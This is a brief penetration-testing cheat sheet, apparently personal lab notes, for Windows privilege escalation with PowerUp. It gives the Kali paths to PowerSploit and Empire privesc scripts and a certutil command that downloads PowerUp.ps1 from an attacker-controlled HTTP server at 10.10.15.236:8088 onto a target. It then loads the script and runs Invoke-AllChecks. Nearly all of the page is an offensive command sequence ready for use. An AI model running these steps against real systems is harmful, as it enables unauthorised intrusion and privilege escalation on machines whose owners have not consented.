# Binary
```shell
cd /usr/share/powershell-empire/empire/server/data/module_source/privesc/

cd /usr/share/windows-resources/powersploit/Privesc/
```
# Send Data
```powershell
certutil -urlcache -split -f http://10.10.15.236:8088/PowerUp.ps1 PowerUp.ps1
```
# Run
```powershell
. .\PowerUp.ps1

Invoke-AllChecks
```
![](Attachments/Pasted%20image%2020260904144019.png)